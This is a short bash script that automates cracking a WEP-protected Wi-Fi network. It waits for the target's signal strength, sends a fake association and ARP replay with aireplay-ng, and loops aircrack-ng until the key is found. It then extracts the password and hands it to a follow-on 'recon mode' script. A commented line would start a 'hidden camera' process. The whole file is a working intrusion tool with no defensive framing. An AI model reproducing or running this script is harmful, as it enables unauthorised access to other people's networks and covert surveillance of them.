#!/bin/bash

sleep 5

SSID="$1"

while true; do
	PWR=$(tac capFiles/air_output.txt | grep $SSID | head -1 | awk -F' ' '{print $2}')
	echo $PWR
	sleep .2
	if (($PWR >= $2)); then
		echo "[*] Power signal threshold reached"
		sleep 5
		clear
		echo "[*] Launching attack on network"
		break
	fi
done

#Launch WEP attack

wlanMAC="$(cat /sys/class/net/wlan1mon/address)"
BSSID="$3"
CHANNEL="$4"

./redLED.py &

#Start hidden camera process
#sudo ./../reconMode/hiddenCam.sh 2>/dev/null &

#This command sends an association request
aireplay-ng -1 0 -a $BSSID -h $wlanMAC wlan1mon

#This captures an ARP packet and replays it in order to generate IVs
aireplay-ng -3 -b $BSSID -h $wlanMAC wlan1mon &

#Start brute force cracker on data capture file
while true; do
	sleep 120
	aircrack-ng -q -b $BSSID capFiles/psk-01.cap > capFiles/key.txt &
	sleep 90
	if grep "KEY FOUND" capFiles/key.txt
	then
		break
	else
		sudo kill $(ps -aux | grep -m 1 aircrack | awk -F' ' '{print $2}')
		sleep 10
		aircrack-ng -q -b $BSSID capFiles/psk-01.cap > capFiles/key.txt &
	fi
done

#Key found

pass="$(cat capFiles/key.txt | grep -m 1 ASCII | awk -F' ' '{print $7}')"

#Start recon mode

./../reconMode/reUp.sh "$SSID" "$pass"

